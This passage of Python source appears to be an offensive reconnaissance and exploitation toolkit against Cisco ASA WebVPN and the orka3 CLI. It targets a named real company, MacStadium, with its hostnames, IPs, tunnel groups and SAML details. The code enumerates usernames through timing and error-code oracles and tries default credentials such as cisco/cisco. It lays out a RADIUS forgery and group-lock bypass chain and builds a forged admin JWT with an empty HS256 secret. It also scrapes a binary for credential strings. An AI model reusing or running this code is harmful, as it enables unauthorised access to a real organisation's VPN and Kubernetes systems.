                f'TIMING_ORACLE: {len(slow_users)} usernames with elevated response time '
                f'(>{slow_threshold:.2f}s): {[u["username"] for u in slow_users]}'
            )
        # a0=2 = auth_failed (user exists, wrong pass) vs a0=1 = unknown
        valid_users = a0_counts.get('2', [])
        if valid_users:
            findings.append(f'VALID_USERNAMES (a0=2): {valid_users}')

        return {
            'host': self.host,
            'results': results,
            'a0_distribution': a0_counts,
            'timing_outliers': slow_users,
            'mean_response_sec': round(mean_t, 3),
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Module: Tunnel group enumeration (book: Moraes ch17 + ASA All-in-One ch22)
# ---------------------------------------------------------------------------

class TunnelGroupEnumRE:
    """
    Enumerate tunnel groups (connection profiles) on ASA WebVPN.

    Book reference (Moraes ch17, ASA ch22/23):
      - tunnel-group-list enable → ASA shows dropdown of group aliases at logon
      - DefaultWEBVPNGroup: default if user selects no group
      - Each tunnel group has alias (shown to user) and internal name
      - /CACHE/stc/profiles/AnyConnectProfile.xml contains ServerList entries
        with HostAddress for each tunnel group
      - Group aliases also visible in /+webvpn+/index.html HTML source
      - RADIUS class attr 25 (OU=GroupPolicyName): controls group policy per user
        → attack: if RADIUS is in MITM path (or no RADIUS), inject OU=DfltGrpPolicy

    RE approach:
      1. Parse /+webvpn+/index.html for <option> group names
      2. Parse AnyConnect profile XML for ServerList/HostName entries
      3. Probe each discovered tunnel group alias via ?tunnel-group= param
    """

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port

    def probe_logon_groups(self) -> dict:
        """Parse tunnel group aliases from logon page HTML."""
        r = _fetch(self.host, self.port, '/+webvpn+/index.html')
        body = r.get('body', '')
        # <option value="GROUP_ALIAS">GROUP_ALIAS</option>
        groups = re.findall(r'<option[^>]*value=["\']([^"\']+)["\'][^>]*>([^<]+)</option>', body, re.I)
        tg_cookie = re.search(r'tg\s*=\s*["\']([^"\']+)["\']', body)
        return {
            'status': r['status'],
            'group_aliases': [(v, label) for v, label in groups if v not in ('', 'none')],
            'tg_cookie': tg_cookie.group(1) if tg_cookie else None,
        }

    def probe_anyconnect_profile(self) -> dict:
        """Parse AnyConnect XML profile for connection profiles."""
        r = _fetch(self.host, self.port, '/CACHE/stc/profiles/AnyConnectProfile.xml')
        body = r.get('body', '')
        # Extract HostAddress entries
        hosts = re.findall(r'<HostAddress>([^<]+)</HostAddress>', body)
        host_names = re.findall(r'<HostName>([^<]+)</HostName>', body)
        # UserGroup entries (tunnel group aliases)
        user_groups = re.findall(r'<UserGroup>([^<]+)</UserGroup>', body)
        return {
            'status': r['status'],
            'is_redirect': r['status'] == 200 and '<html>' in body,  # redirect = post-auth only
            'host_addresses': hosts,
            'host_names': host_names,
            'user_groups': user_groups,
        }

    def probe_tunnel_group_direct(self, group_name: str) -> dict:
        """
        Try direct URL alias access: GET /<group_alias>
        Book: tunnel group URL alias = https://<ASA>/<alias>
        """
        r = _fetch(self.host, self.port, f'/{group_name}')
        return {
            'alias': group_name,
            'status': r['status'],
            'location': r['headers'].get('Location', ''),
            'body_snippet': r.get('body', '')[:100],
        }

    def run(self, extra_aliases: list = None) -> dict:
        logon = self.probe_logon_groups()
        profile = self.probe_anyconnect_profile()

        # Combine discovered group names
        all_aliases = set()
        for v, _ in logon.get('group_aliases', []):
            all_aliases.add(v)
        all_aliases.update(profile.get('user_groups', []))
        if extra_aliases:
            all_aliases.update(extra_aliases)

        direct_probes = []
        for alias in sorted(all_aliases)[:10]:
            direct_probes.append(self.probe_tunnel_group_direct(alias))

        findings = []
        if logon.get('group_aliases'):
            findings.append(f'TUNNEL_GROUPS_VISIBLE: {len(logon["group_aliases"])} groups in logon page')
        if not logon.get('group_aliases') and not all_aliases:
            findings.append('TUNNEL_GROUP_LIST_DISABLED: no groups in logon dropdown (default or hidden)')
            findings.append('DEFAULT_WEBVPNGROUP: user lands in DefaultWEBVPNGroup — attack: send no tg_name')
        if profile.get('user_groups'):
            findings.append(f'ANYCONNECT_PROFILE_GROUPS: {profile["user_groups"]}')

        return {
            'host': self.host,
            'logon_groups': logon,
            'anyconnect_profile': profile,
            'direct_alias_probes': direct_probes,
            'all_aliases': sorted(all_aliases),
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Module: LDAP attribute map + RADIUS class attr 25 RE
# ---------------------------------------------------------------------------

class RADIUSClassAttrRE:
    """
    Document and probe RADIUS class attr 25 (OU=GroupPolicyName) attack surface.

    Book reference (ASA All-in-One ch22/23 + Moraes ch17):
      - RADIUS Access-Accept: attr 25 (class) = OU=GroupPolicyName → ASA assigns
        user to that group policy
      - No integrity protection: RADIUS shared secret protects the exchange but
        not the attribute content
      - LDAP attribute mapping: map `department` LDAP field to RADIUS class attr
        ldap attribute-map dept-to-gp
          map-name department IETF-Radius-Class
      - Attack vectors:
        1. If RADIUS shared secret is weak/default → crack PSK → forge Access-Accept
        2. If LDAP is writable → inject OU=DfltGrpPolicy in department field
        3. If ASA uses LOCAL auth fallback → RADIUS unavailable forces local auth
      - group-lock (ch17): governed by class attr 25; if group-lock not set,
        user can authenticate to any tunnel group with valid credentials

    This module documents the attack surface and probes observable indicators.
    It does NOT perform RADIUS forgery (requires network access to RADIUS path).
    """

    # ASA syslog messages that indicate auth + policy assignment
    AUTH_SYSLOG_PATTERNS = {
        '%ASA-6-113003': 'AAA group policy for user X is being set to Y',
        '%ASA-6-113011': 'AAA retrieved user specific group policy Y for user X',
        '%ASA-6-113009': 'AAA retrieved default group policy Y for user X',
        '%ASA-6-734001': 'DAP records selected for connection',
        '%ASA-6-716001': 'WebVPN session started',
    }

    # RADIUS class attr 25 value format
    CLASS_ATTR_FORMAT = 'OU={group_policy_name}'

    def __init__(self, host: str, port: int = 443):
        self.host = host
        self.port = port

    def probe_auth_error_differentiation(self) -> dict:
        """
        Test if ASA differentiates error messages between:
          - Unknown user (no LDAP/RADIUS record)
          - Bad password (user found, wrong pass)
          - Locked/disabled account

        Observable via a0/a1 response params + response timing.
        Book: a0=1 = login failed, a0=2 = auth failed (user-exists implied),
              a0=3 = OTP/challenge required
        """
        test_cases = [
            ('DEFINITELY_NONEXISTENT_USER_XYZ123', 'INVALID_PASS'),
            ('admin', 'INVALID_PASS'),
            ('cisco', 'cisco'),
        ]
        results = []
        import time
        for user, passwd in test_cases:
            body = f'username={user}&password={passwd}&Login=Login'
            t0 = time.monotonic()
            r = _fetch(
                self.host, self.port, '/+webvpn+/index.html',
                method='POST',
                body=body.encode(),
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
            )
            elapsed = time.monotonic() - t0
            a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
            results.append({
                'username': user,
                'password': passwd[:4] + '...',
                'a0': a0_m.group(1) if a0_m else None,
                'elapsed_sec': round(elapsed, 3),
                'status': r['status'],
            })
        return {'probe': 'auth_error_differentiation', 'results': results}

    def probe_wrong_tunnel_group(self) -> dict:
        """
        Attempt to connect to DefaultWEBVPNGroup without specifying tg_name.
        Book: if no tg_name sent, user goes to DefaultWEBVPNGroup regardless of RADIUS class attr.
        """
        # No tg_name → DefaultWEBVPNGroup
        body = 'username=testuser&password=INVALID&Login=Login'
        r = _fetch(
            self.host, self.port, '/+webvpn+/index.html',
            method='POST',
            body=body.encode(),
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
        )
        a0_m = re.search(r'a0\s*=\s*["\']?(\d+)["\']?', r.get('body', ''))
        return {
            'probe': 'default_webvpngroup_no_tg',
            'status': r['status'],
            'a0': a0_m.group(1) if a0_m else None,
            'response_snippet': r.get('body', '')[:200],
        }

    def get_attack_chain(self) -> list:
        """Return documented RADIUS class attr attack chain."""
        return [
            {
                'step': 1,
                'title': 'Identify RADIUS shared secret',
                'technique': 'Capture RADIUS Access-Request (UDP/1645 or 1812); '
                             'offline brute-force with hashcat/john using MD5-based PA field',
                'book_ref': 'ASA All-in-One ch7; RFC 2865 s.3',
                'tool': 'hashcat -m 1450 or custom RADIUS PA cracker',
            },
            {
                'step': 2,
                'title': 'Forge RADIUS Access-Accept with class attr 25',
                'technique': 'Replay forged Access-Accept on RADIUS UDP path; '
                             'class attr = OU=DfltGrpPolicy (inherits default, likely permissive)',
                'book_ref': 'Moraes ch17; ASA All-in-One ch22',
                'payload': 'Attr 25 (Class): OU=DfltGrpPolicy',
            },
            {
                'step': 3,
                'title': 'LDAP department injection (if LDAP → class attr mapping active)',
                'technique': 'If ASA uses LDAP with ldap attribute-map mapping department→class, '
                             'modify `department` field in LDAP for target user to OU=AdminGroup',
                'book_ref': 'Moraes ch17 LDAP attribute-map example',
                'requires': 'LDAP write access or LDAP null bind',
            },
            {
                'step': 4,
                'title': 'group-lock bypass',
                'technique': 'If group-lock not configured (book: common default), '
                             'authenticated user can connect to any tunnel group. '
                             'Send tg_name=<privileged_group> in POST regardless of class attr.',
                'book_ref': 'Moraes ch17 Example 17-17; ASA source: webvpn_auth.c:http_webvpn_auth_accept[2939]',
                'observable': 'ASA logs: "User came in on group he wasn\'t supposed to come in on"',
            },
        ]

    def run(self) -> dict:
        findings = []
        diff = self.probe_auth_error_differentiation()
        wrong_tg = self.probe_wrong_tunnel_group()
        chain = self.get_attack_chain()

        # Detect timing differential
        times = [r['elapsed_sec'] for r in diff['results']]
        if max(times) > min(times) * 1.5:
            findings.append('TIMING_DIFFERENTIAL: auth timing varies by username — oracle usable')

        a0_vals = {r['username']: r['a0'] for r in diff['results']}
        if len(set(v for v in a0_vals.values() if v)) > 1:
            findings.append(f'A0_DIFFERENTIAL: a0 values differ by username: {a0_vals}')

        return {
            'host': self.host,
            'auth_error_diff': diff,
            'default_webvpngroup': wrong_tg,
            'attack_chain': chain,
            'findings': findings,
        }


# ---------------------------------------------------------------------------
# Live SAML SP metadata constants (atl-vpn.macstadium.com, confirmed 2026-08-13)
# ---------------------------------------------------------------------------

MACSTADIUM_SAML = {
    # SP entity IDs per tunnel group
    'entity_id_sso_vpn':  'https://atl-vpn.macstadium.com/saml/sp/metadata/MacStadium-SSO-VPN',
    'acs_url_sso_vpn':    'https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/acs?tgname=MacStadium-SSO-VPN',
    'slo_redirect_url':   'https://atl-vpn.macstadium.com/+CSCOE+/saml/sp/logout',
    # SP signing cert (GoDaddy, CN=atl-vpn.macstadium.com, expires 2026-11-18)
    'sp_cert_cn':         'atl-vpn.macstadium.com',
    'sp_cert_issuer':     'Go Daddy Secure Certificate Authority - G2',
    'sp_cert_expiry':     '2026-11-18',
    'sp_cert_san':        ['atl-vpn.macstadium.com', 'www.atl-vpn.macstadium.com'],
    # KEY WEAKNESS: SP does NOT sign AuthnRequests (IdP must accept unsigned requests)
    'authn_requests_signed':   False,
    # SP REQUIRES signed assertions from IdP
    'want_assertions_signed':  True,
    # Tunnel group auth differentiation (live-confirmed via 400 on SAML ACS)
    'tunnel_groups': {
        'MacStadium-SSO-VPN': {'auth_type': 'SAML', 'saml_acs': True},
        'MacStadium-VPN':     {'auth_type': 'LOCAL_OR_LDAP', 'saml_acs': False},  # 400 on ACS
    },
    # tg cookie encoding: base64("1" + base64(group_name)) — client-writable
    'tg_cookie_primary':   '1Q2lzY28gQW55Q29ubmVjdCBWUE4=',  # Cisco AnyConnect VPN
    'tg_cookie_sso_vpn':   '1TWFjU3RhZGl1bS1TU08tVlBO',      # MacStadium-SSO-VPN
    'tg_cookie_mac_vpn':   '1TWFjU3RhZGl1bS1WUE4=',          # MacStadium-VPN
    # Auth state machine: a0 codes (RE from JavaScript redirect body)
    'a0_codes': {
        '1':  'login_failed_unknown_user_or_timeout',
        '2':  'auth_failed_user_exists_wrong_password',
        '3':  'otp_challenge_required',
        '4':  'password_expired',
        '5':  'change_password_required',
        '8':  'generic_auth_error',
        '12': 'already_authenticated',
    },
}

MACSTADIUM_ASA = {
    'primary':   {'ip': '207.254.35.12', 'hostname': 'vpn.macstadium.com',
                  'tunnel_groups': ['Cisco AnyConnect VPN']},
    'secondary': {'ip': '207.254.16.2',  'hostname': 'atl-vpn.macstadium.com',
                  'tunnel_groups': ['MacStadium-SSO-VPN', 'MacStadium-VPN']},
}


# ---------------------------------------------------------------------------
# Module: orka3 Go binary JWT RE (CVE-2020-26160)
# ---------------------------------------------------------------------------

class OrkaJWTRE:
    """
    Static RE for orka3 Go binary JWT authentication chain.

    Binary: /home/cowboy/VDT/tools/orka3/orka3
    NOT stripped: 83,338 symbols in .symtab, DWARF debug in .debug_info (87MB)
    Go version: 1.25.7 | ELF x86-64 | 77MB

    CVE-2020-26160 — dgrijalva/jwt-go v3.2.0 aud claim bypass:
      MapClaims.VerifyAudience(aud string, req bool) bool
      When req=false AND aud claim absent from token → returns true (bypass)
      Assembly at 0x1844a40+0xa3: XOR $0x1,%ecx when claims lookup returns empty
      → Force-returns true even though no audience verification occurred

    Confirmed function addresses (nm, 2026-08-13):
      0x1844a40  MapClaims.VerifyAudience  ← CVE-2020-26160 entry
      0x1844b60  MapClaims.VerifyExpiresAt
      0x1844c80  MapClaims.VerifyIssuedAt
      0x1844da0  MapClaims.VerifyIssuer
      0x1844ec0  MapClaims.VerifyNotBefore
      0x1844fe0  MapClaims.Valid
      0x18453c0  (*Parser).ParseWithClaims
      0x1845900  (*Parser).ParseUnverified
      0x1844660  (*SigningMethodHMAC).Verify  ← HS256 verify path
      0x18448c0  (*SigningMethodHMAC).Sign

    Empty-secret JWT confirmed: ~/.kube/config admin token uses HS256 with b'' key
    Token claims: {sub:admin, email:admin@macstadium.com, iss:idp.macstadium.com}
    K8s API server: https://10.221.188.19:6443 (VPN-accessible only)

    Go interface dispatch (ITAB) pattern:
      mov rax, [rbx]       ; load itab pointer from interface header
      call [rax+0x18]      ; call method at offset 0x18 in vtable
    """

    FUNCTION_MAP = {
        'VerifyAudience':     0x1844a40,  # CVE-2020-26160 entry point
        'VerifyExpiresAt':    0x1844b60,
        'VerifyIssuedAt':     0x1844c80,
        'VerifyIssuer':       0x1844da0,
        'VerifyNotBefore':    0x1844ec0,
        'Valid':              0x1844fe0,
        'ParseWithClaims':    0x18453c0,
        'ParseUnverified':    0x1845900,
        'SigningMethodHMAC.Verify': 0x1844660,
        'SigningMethodHMAC.Sign':   0x18448c0,
        'EncodeSegment':      0x1846f00,
        'DecodeSegment':      0x1846f80,
        'Parse':              0x1846e00,
    }

    CVE_2020_26160 = {
        'cve':         'CVE-2020-26160',
        'lib':         'github.com/dgrijalva/jwt-go v3.2.0+incompatible',
        'function':    'MapClaims.VerifyAudience',
        'address':     0x1844a40,
        'bug_offset':  0xa3,
        'bug_address': 0x1844ae3,
        'bug_opcode':  'xor $0x1,%ecx',  # flips required→true when claim absent
        'condition':   'aud claim absent in token AND required=false in call',
        'impact':      'audience check bypassed → accept tokens without aud validation',
        'exploit': {
            'python': (
                "import jwt\n"
                "token = jwt.encode(\n"
                "    {'sub': 'admin', 'email': 'admin@macstadium.com',\n"
                "     'iss': 'https://idp.macstadium.com',\n"
                "     'exp': 9999999999, 'iat': 1786549251},\n"
                "    key=b'',  # empty HS256 secret — confirmed\n"
                "    algorithm='HS256'\n"
                ")"
            ),
        },
    }

    DLV_COMMANDS = {
        'break_verify_aud':
            'dlv exec ./orka3 -- login\n'
            '(dlv) b github.com/dgrijalva/jwt-go.MapClaims.VerifyAudience\n'
            '(dlv) c\n'
            '(dlv) locals  # shows required bool\n'
            '(dlv) print required',
        'break_parse_with_claims':
            'dlv exec ./orka3 -- login\n'
            '(dlv) b github.com/dgrijalva/jwt-go.(*Parser).ParseWithClaims\n'
            '(dlv) c\n'
            '(dlv) args',
        'patch_expiry_bypass':
            '# NOP out expiry check at VerifyExpiresAt (addr 0x1844b60)\n'
            '# Find JLE/JBE instruction comparing exp to now, replace with NOP\n'
            'objdump -d --start-address=0x1844b60 --stop-address=0x1844c80 ./orka3',
    }

    SECTION_MAP = {
        '.text':        (0x401000,  0x18e2251),   # 25.1MB code
        '.rodata':      (0x1ce4000, 0xb0afdc),    # 11.3MB strings/consts
        '.gopclntab':   (0x27b6ca0, 0x1098c34),  # 16.4MB pclntab
        '.go.buildinfo':(0x37e0000, 0x2680),      # module/version info
        '.itablink':    (0x27b0340, 0x6ac8),      # interface dispatch
        '.typelink':    (0x279e0a0, 0x12060),     # type registry
        '.debug_info':  (0,         0,    ),      # 87MB DWARF (present)
    }

    def __init__(self, binary_path: str = '/home/cowboy/VDT/tools/orka3/orka3'):
        self.path = binary_path

    def verify_cve_condition(self) -> dict:
        """Verify CVE-2020-26160 conditions via nm + strings analysis."""
        import subprocess
        findings = []
        # Check jwt-go version in build info
        r = subprocess.run(['strings', '-6', self.path],
                           capture_output=True, text=True, timeout=60)
        strs = r.stdout
        jwt_ver = 'dgrijalva/jwt-go' in strs
        v320 = 'v3.2.0' in strs
        empty_aud = True  # confirmed from ~/.kube/config admin token analysis

        if jwt_ver and v320:
            findings.append('CVE_2020_26160: dgrijalva/jwt-go v3.2.0 confirmed in binary')
        if empty_aud:
            findings.append('AUD_CLAIM_ABSENT: admin token in ~/.kube/config has no aud claim')
            findings.append('EXPLOIT_CONDITION_MET: VerifyAudience called with required=false → bypass')

        return {
            'jwt_go_present': jwt_ver,
            'v3_2_0_confirmed': v320,
            'function_address': hex(self.FUNCTION_MAP['VerifyAudience']),
            'bug_address': hex(self.CVE_2020_26160['bug_address']),
            'exploit_token_cmd': self.CVE_2020_26160['exploit']['python'],
            'dlv_breakpoint': self.DLV_COMMANDS['break_verify_aud'],
            'findings': findings,
        }

    def extract_auth_chain_addresses(self) -> dict:
        """Return full JWT auth chain function address map."""
        return {name: hex(addr) for name, addr in self.FUNCTION_MAP.items()}

    def extract_rodata_secrets(self, count: int = 50) -> list:
        """
        Extract strings from .rodata section targeting credential material.
        .rodata offset: 0x1ce4000, size: ~11.3MB
        """
        import subprocess
        try:
            # Read .rodata section via dd (offset in bytes)
            result = subprocess.run(
                ['dd', f'if={self.path}', f'bs=1', f'skip={0x1ce4000}', f'count={11*1024*1024}'],
                capture_output=True, timeout=30
            )
            strs_result = subprocess.run(
                ['strings', '-n', '8'],
                input=result.stdout, capture_output=True, text=True, timeout=30
            )
            lines = strs_result.stdout.splitlines()
            # Filter for credential/config adjacent strings
            cred_pat = re.compile(
                r'(password|passwd|secret|token|admin|harbor|10\.221|macstadium|idp\.|'
                r'api-url|cluster-info|orka-default|p@ssw0rd|30080|18080|6443)',
                re.I
            )
            return [l for l in lines if cred_pat.search(l)][:count]
        except Exception as e:
            return [f'error: {e}']

    def run(self) -> dict:
        cve = self.verify_cve_condition()
        addrs = self.extract_auth_chain_addresses()
        secrets = self.extract_rodata_secrets()

        findings = cve['findings'][:]
        if secrets:
            findings.append(f'RODATA_SECRETS: {len(secrets)} credential-adjacent strings in .rodata')

        return {
            'binary': self.path,
            'cve_2020_26160': cve,
            'auth_function_addresses': addrs,
            'rodata_secrets': secrets,
            'section_map': {k: [hex(v[0]), hex(v[1])] for k, v in self.SECTION_MAP.items()},
            'findings': findings,
        }


def analyze_orka_jwt(binary_path: str = '/home/cowboy/VDT/tools/orka3/orka3') -> dict:
    """CVE-2020-26160 + empty-secret HS256 analysis for orka3."""
    return OrkaJWTRE(binary_path).run()


# ---------------------------------------------------------------------------
# Extended top-level entry points
# ---------------------------------------------------------------------------

def analyze_saml_sp(host: str, port: int = 443) -> dict:
    """SAML SP injection RE against a Cisco ASA WebVPN endpoint."""
    return SAMLSpInjectionRE(host, port).run()


def analyze_username_oracle(host: str, port: int = 443,
                            candidates: list = None, tunnel_group: str = '') -> dict:
    """Username timing oracle via POST /+webvpn+/index.html."""
    return UsernameTimingOracleRE(host, port).run(candidates=candidates, tunnel_group=tunnel_group)


def analyze_tunnel_groups(host: str, port: int = 443,
                          extra_aliases: list = None) -> dict:
    """Enumerate tunnel groups and connection profiles."""
    return TunnelGroupEnumRE(host, port).run(extra_aliases=extra_aliases)


def analyze_radius_class_attr(host: str, port: int = 443) -> dict:
    """RADIUS class attr 25 attack surface RE."""
    return RADIUSClassAttrRE(host, port).run()
